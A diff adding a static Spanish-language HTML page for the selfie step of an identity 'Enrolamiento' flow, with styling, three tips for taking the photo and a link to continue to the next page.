@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enrolamiento</title>
+    <link rel="icon" href="data:,">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .back-arrow {
+            font-size: 24px;
+            color: #1a2b6b;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+        
+        .header-title {
+            flex: 1;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a2b6b;
+            margin-right: 44px;
+        }
+        
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px 20px;
+        }
+        
+        .main-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a2b6b;
+            text-align: center;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 15px;
+            line-height: 1.4;
+            max-width: 320px;
+        }
+        
+        .phone-image {
+            width: 180px;
+            margin: 10px 0 15px;
+        }
+        
+        .recuerda-section {
+            width: 100%;
+            max-width: 350px;
+            padding: 0 10px;
+        }
+        
+        .recuerda-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a2b6b;
+            margin-bottom: 12px;
+        }
+        
+        .recuerda-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        
+        .recuerda-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #f0f4ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .recuerda-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: #1a2b6b;
+        }
+        
+        .recuerda-text {
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .btn-container {
+            width: 100%;
+            padding: 10px 20px;
+            margin-top: -40px;
+        }
+        
+        .btn-continuar {
+            display: block;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 16px;
+            background: #ffdd00;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a2b6b;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+        }
+        
+        .btn-continuar:hover {
+            background: #f0d000;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="javascript:history.back()" class="back-arrow">←</a>
+        <span class="header-title">Enrolamiento</span>
+    </div>
+    
+    <div class="content">
+        <h1 class="main-title">Validemos tu identidad con una fotografía</h1>
+        <p class="subtitle">Usando tu cámara delantera se confirmará que eres tú quien está realizando este proceso.</p>
+        
+        <img src="imggg.png" alt="Verificación" class="phone-image">
+        
+        <div class="recuerda-section">
+            <h2 class="recuerda-title">Recuerda:</h2>
+            
+            <div class="recuerda-item">
+                <div class="recuerda-icon">
+                    <svg viewBox="0 0 24 24"><circle cx="9" cy="9" r="2"/><circle cx="15" cy="9" r="2"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-6c.78 2.34 2.72 4 5 4s4.22-1.66 5-4H7z"/></svg>
+                </div>
+                <span class="recuerda-text">No cubras tu rostro</span>
+            </div>
+            
+            <div class="recuerda-item">
+                <div class="recuerda-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.65 0-3-1.35-3-3s1.35-3 3-3 3 1.35 3 3-1.35 3-3 3zm0-13C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+                </div>
+                <span class="recuerda-text">Busca un lugar bien iluminado</span>
+            </div>
+            
+            <div class="recuerda-item">
+                <div class="recuerda-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                </div>
+                <span class="recuerda-text">Mantén tu rostro dentro del círculo.</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="btn-container">
+        <a href="selfie.html" class="btn-continuar">Continuar</a>
+    </div>
+<script src="protect.js"></script>
+</body>
+</html>
